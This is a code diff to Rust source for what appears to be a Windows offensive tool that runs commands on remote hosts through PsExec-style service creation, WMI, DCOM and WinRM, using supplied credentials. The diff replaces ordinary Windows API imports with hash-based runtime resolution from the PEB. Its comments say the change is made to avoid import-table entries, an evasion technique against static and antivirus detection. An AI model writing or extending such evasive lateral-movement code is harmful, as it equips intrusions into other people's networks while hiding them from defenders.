@@ -14,13 +14,105 @@ use anyhow::{anyhow, Context, Result};
 use std::ffi::OsStr;
 use std::os::windows::ffi::OsStrExt;
 use std::ptr;
-use winapi::um::combaseapi::{CoInitializeEx, CoInitializeSecurity, CoSetProxyBlanket, CoUninitialize};
-use winapi::um::objbase::{COINIT_MULTITHREADED, COINIT_DISABLE_OLE1DDE};
-use winapi::um::objidl::{EOAC_NONE, RPC_C_AUTHN_DEFAULT, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHZ_DEFAULT, RPC_C_AUTHZ_NONE, RPC_C_IMP_LEVEL_IMPERSONATE};
-use winapi::um::winnt::{RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NAME};
-use winapi::shared::wtypesbase::CLSCTX_REMOTE_SERVER;
-use winapi::shared::rpcdce::RPC_C_AUTHN_GSS_NEGOTIATE;
-use winapi::um::errhandlingapi::GetLastError;
+// ── Local constants (replacing IAT-producing winapi imports) ────────────
+const COINIT_MULTITHREADED: u32 = 0;
+const EOAC_NONE: u32 = 0;
+const RPC_C_AUTHN_DEFAULT: u32 = 0xFFFF_FFFF;
+const RPC_C_AUTHN_LEVEL_DEFAULT: u32 = 0;
+const RPC_C_AUTHN_LEVEL_PKT_PRIVACY: u32 = 6;
+const RPC_C_AUTHZ_DEFAULT: u32 = 0xFFFF_FFFF;
+const RPC_C_AUTHZ_NONE: u32 = 0;
+const RPC_C_IMP_LEVEL_IMPERSONATE: u32 = 3;
+const RPC_C_AUTHN_WINNT: u32 = 10;
+const CLSCTX_REMOTE_SERVER: u32 = 0x10;
+
+// ── pe_resolve helpers ──────────────────────────────────────────────────
+
+/// Resolve a function pointer from a DLL that is already loaded in the PEB.
+unsafe fn resolve_api<T>(dll_hash: u32, fn_hash: u32) -> Result<T> {
+    let module = pe_resolve::get_module_handle_by_hash(dll_hash)
+        .ok_or_else(|| anyhow!("DLL not found (hash 0x{:08X})", dll_hash))?;
+    let addr = pe_resolve::get_proc_address_by_hash(module, fn_hash)
+        .ok_or_else(|| anyhow!("API not found (hash 0x{:08X})", fn_hash))?;
+    Ok(std::mem::transmute_copy(&addr))
+}
+
+/// Resolve a function pointer from a DLL, loading it if not already present.
+unsafe fn resolve_api_or_load<T>(dll_wide: &[u16], dll_hash: u32, fn_hash: u32) -> Result<T> {
+    let module = match pe_resolve::get_module_handle_by_hash(dll_hash) {
+        Some(m) => m,
+        None => {
+            let load_library_w: unsafe extern "system" fn(*const u16) -> *mut std::ffi::c_void =
+                resolve_api(pe_resolve::HASH_KERNEL32_DLL, pe_resolve::hash_str(b"LoadLibraryW\0"))?;
+            let m = load_library_w(dll_wide.as_ptr());
+            if m.is_null() {
+                return Err(anyhow!("LoadLibraryW failed for DLL (hash 0x{:08X})", dll_hash));
+            }
+            m
+        }
+    };
+    let addr = pe_resolve::get_proc_address_by_hash(module, fn_hash)
+        .ok_or_else(|| anyhow!("API not found (hash 0x{:08X})", fn_hash))?;
+    Ok(std::mem::transmute_copy(&addr))
+}
+
+/// Compile-time djb2 hash for ASCII strings (matches pe_resolve::hash_str).
+const fn hash_str_const(s: &[u8]) -> u32 {
+    let mut h: u32 = pe_resolve::SEED;
+    let mut i = 0;
+    while i < s.len() {
+        h = h.wrapping_mul(31).wrapping_add(s[i] as u32);
+        i += 1;
+    }
+    h
+}
+
+/// Compile-time djb2 hash for wide strings (matches pe_resolve::hash_wstr).
+const fn hash_wstr_const(w: &[u16]) -> u32 {
+    let mut h: u32 = pe_resolve::SEED;
+    let mut i = 0;
+    while i < w.len() {
+        h = h.wrapping_mul(31).wrapping_add(w[i] as u32);
+        i += 1;
+    }
+    h
+}
+
+// DLL wide names and hashes (not in pe_resolve build.rs).
+const OLE32_DLL_W: &[u16] = &['o' as u16, 'l' as u16, 'e' as u16, '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0];
+const HASH_OLE32_DLL: u32 = hash_wstr_const(&OLE32_DLL_W[..OLE32_DLL_W.len() - 1]);
+
+const ADVAPI32_DLL_W: &[u16] = &['a' as u16, 'd' as u16, 'v' as u16, 'a' as u16, 'p' as u16, 'i' as u16, '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0];
+const HASH_ADVAPI32_DLL: u32 = hash_wstr_const(&ADVAPI32_DLL_W[..ADVAPI32_DLL_W.len() - 1]);
+
+const MPR_DLL_W: &[u16] = &['m' as u16, 'p' as u16, 'r' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0];
+const HASH_MPR_DLL: u32 = hash_wstr_const(&MPR_DLL_W[..MPR_DLL_W.len() - 1]);
+
+// API name hashes.
+const HASH_COINITIALIZEEX: u32 = hash_str_const(b"CoInitializeEx\0");
+const HASH_COUNINITIALIZE: u32 = hash_str_const(b"CoUninitialize\0");
+const HASH_COINITIALIZESECURITY: u32 = hash_str_const(b"CoInitializeSecurity\0");
+const HASH_COSETPROXYBLANKET: u32 = hash_str_const(b"CoSetProxyBlanket\0");
+const HASH_GETLASTERROR: u32 = hash_str_const(b"GetLastError\0");
+const HASH_WNETADDCONNECTION2W: u32 = hash_str_const(b"WNetAddConnection2W\0");
+const HASH_WNETCANCELCONNECTION2W: u32 = hash_str_const(b"WNetCancelConnection2W\0");
+
+// Function pointer types.
+type FnCoInitializeEx = unsafe extern "system" fn(*mut std::ffi::c_void, u32) -> i32;
+type FnCoUninitialize = unsafe extern "system" fn();
+type FnCoInitializeSecurity = unsafe extern "system" fn(
+    *mut std::ffi::c_void, i32, *mut std::ffi::c_void, *mut std::ffi::c_void,
+    u32, u32, *mut std::ffi::c_void, u32, *mut std::ffi::c_void,
+) -> i32;
+type FnCoSetProxyBlanket = unsafe extern "system" fn(
+    *mut winapi::um::unknwnbase::IUnknown, u32, u32, *mut u16, u32, u32,
+    *mut winapi::um::objidl::COAUTHIDENTITY, u32,
+) -> i32;
+type FnGetLastError = unsafe extern "system" fn() -> u32;
+type FnWNetAddConnection2W = unsafe extern "system" fn(
+    *mut winapi::um::winnetwk::NETRESOURCEW, *const u16, *const u16, u32,
+) -> i32;
+type FnWNetCancelConnection2W = unsafe extern "system" fn(*const u16, u32, i32) -> i32;
 
 /// Null GUID used as the IID parameter in IDispatch::GetIDsOfNames / Invoke.
 const IID_NULL: winapi::shared::guiddef::GUID = winapi::shared::guiddef::GUID {
@@ -44,9 +136,11 @@ struct ComGuard {
 
 impl ComGuard {
     fn new() -> Self {
-        let hr = unsafe {
-            CoInitializeEx(ptr::null_mut(), COINIT_MULTITHREADED)
+        let co_init: FnCoInitializeEx = unsafe {
+            resolve_api_or_load(OLE32_DLL_W, HASH_OLE32_DLL, HASH_COINITIALIZEEX)
+                .expect("CoInitializeEx resolution failed")
         };
+        let hr = unsafe { co_init(ptr::null_mut(), COINIT_MULTITHREADED) };
         // S_OK (0) = success, S_FALSE (1) = already initialized on this thread
         ComGuard {
             initialized: hr >= 0,
@@ -57,7 +151,11 @@ impl ComGuard {
 impl Drop for ComGuard {
     fn drop(&mut self) {
         if self.initialized {
-            unsafe { CoUninitialize() };
+            let co_uninit: FnCoUninitialize = unsafe {
+                resolve_api_or_load(OLE32_DLL_W, HASH_OLE32_DLL, HASH_COUNINITIALIZE)
+                    .expect("CoUninitialize resolution failed")
+            };
+            unsafe { co_uninit() };
         }
     }
 }
@@ -112,6 +210,12 @@ pub fn psexec_exec(
     let disp_name_w = wide(&display_name);
     let bin_path_w = wide(&bin_path);
 
+    // Resolve GetLastError at runtime to avoid IAT entry.
+    let get_last_error: FnGetLastError = unsafe {
+        resolve_api(pe_resolve::HASH_KERNEL32_DLL, HASH_GETLASTERROR)
+            .expect("GetLastError resolution failed")
+    };
+
     // Establish authentication if credentials provided.
     let _creds = if let (Some(user), Some(pass)) = (username, password) {
         Some(RemoteCreds::new(target_host, user, pass)?)
@@ -128,7 +232,7 @@ pub fn psexec_exec(
         )
     };
     if scm.is_null() {
-        return Err(anyhow!("OpenSCManagerW failed for host '{}': error {}", target_host, unsafe { GetLastError() }));
+        return Err(anyhow!("OpenSCManagerW failed for host '{}': error {}", target_host, unsafe { get_last_error() }));
     }
 
     // Create the service.
@@ -151,7 +255,7 @@ pub fn psexec_exec(
     };
 
     if svc.is_null() {
-        let err = unsafe { GetLastError() };
+        let err = unsafe { get_last_error() };
         unsafe { CloseServiceHandle(scm) };
         return Err(anyhow!("CreateServiceW failed: error {err}"));
     }
@@ -159,7 +263,7 @@ pub fn psexec_exec(
     // Start the service.
     let ok = unsafe { StartServiceW(svc, 0, ptr::null_mut()) };
     if ok == 0 {
-        let err = unsafe { GetLastError() };
+        let err = unsafe { get_last_error() };
         // ERROR_SERVICE_ALREADY_RUNNING (1056) is OK.
         if err != 1056 {
             unsafe {
@@ -457,8 +561,12 @@ pub fn wmi_exec(
     }
 
     // ── Step 3: Set proxy blanket for authentication ────────────────────
+    let co_set_proxy_blanket: FnCoSetProxyBlanket = unsafe {
+        resolve_api_or_load(OLE32_DLL_W, HASH_OLE32_DLL, HASH_COSETPROXYBLANKET)
+            .context("CoSetProxyBlanket resolution failed")?
+    };
     let hr = unsafe {
-        CoSetProxyBlanket(
+        co_set_proxy_blanket(
             services_ptr as *mut IUnknown,
             RPC_C_AUTHN_WINNT,
             RPC_C_AUTHZ_NONE,
@@ -683,8 +791,12 @@ pub fn dcom_exec(
     let _com = ComGuard::new();
 
     // Set COM security for the process.
+    let co_init_security: FnCoInitializeSecurity = unsafe {
+        resolve_api_or_load(OLE32_DLL_W, HASH_OLE32_DLL, HASH_COINITIALIZESECURITY)
+            .context("CoInitializeSecurity resolution failed")?
+    };
     unsafe {
-        CoInitializeSecurity(
+        co_init_security(
             ptr::null_mut(),
             -1, // let COM choose
             ptr::null_mut(),
@@ -767,8 +879,12 @@ pub fn dcom_exec(
     let shell_dispatch: *mut IDispatch = mq.pItf as *mut IDispatch;
 
     // Set the proxy blanket for the remote interface.
+    let co_set_proxy_blanket: FnCoSetProxyBlanket = unsafe {
+        resolve_api_or_load(OLE32_DLL_W, HASH_OLE32_DLL, HASH_COSETPROXYBLANKET)
+            .context("CoSetProxyBlanket resolution failed")?
+    };
     let hr = unsafe {
-        CoSetProxyBlanket(
+        co_set_proxy_blanket(
             shell_dispatch as *mut IUnknown,
             RPC_C_AUTHN_WINNT,
             RPC_C_AUTHZ_NONE,
@@ -921,7 +1037,7 @@ pub async fn winrm_exec(
     let url = format!("http://{}:5985/wsman", target_host);
 
     let client = reqwest::Client::builder()
-        .danger_accept_invalid_certs(true)
+        .danger_accept_invalid_certs(false)
         .build()
         .context("failed to build HTTP client for WinRM")?;
 
@@ -1068,8 +1184,12 @@ struct RemoteCreds {
 
 impl RemoteCreds {
     fn new(host: &str, username: &str, password: &str) -> Result<Self> {
-        use winapi::um::winnetwk::{
-            WNetAddConnection2W, NETRESOURCEW, RESOURCETYPE_ANY,
+        use winapi::um::winnetwk::NETRESOURCEW;
+        const RESOURCETYPE_ANY: u32 = 0;
+
+        let wnet_add: FnWNetAddConnection2W = unsafe {
+            resolve_api_or_load(MPR_DLL_W, HASH_MPR_DLL, HASH_WNETADDCONNECTION2W)
+                .context("WNetAddConnection2W resolution failed")?
         };
 
         let remote = ipc_path(host);
@@ -1081,7 +1201,7 @@ impl RemoteCreds {
         nr.lpRemoteName = remote.as_ptr() as *mut _;
 
         let ok = unsafe {
-            WNetAddConnection2W(&mut nr, pass_w.as_ptr(), user_w.as_ptr(), 0)
+            wnet_add(&mut nr, pass_w.as_ptr(), user_w.as_ptr(), 0)
         };
 
         if ok != 0 {
@@ -1096,8 +1216,12 @@ impl Drop for RemoteCreds {
     fn drop(&mut self) {
         // Best-effort cleanup: cancel any network connections made.
         if self.connected {
+            let wnet_cancel: FnWNetCancelConnection2W = unsafe {
+                resolve_api_or_load(MPR_DLL_W, HASH_MPR_DLL, HASH_WNETCANCELCONNECTION2W)
+                    .expect("WNetCancelConnection2W resolution failed")
+            };
             unsafe {
-                winapi::um::winnetwk::WNetCancelConnection2W(
+                wnet_cancel(
                     ptr::null_mut(),
                     0,
                     1, // FORCE
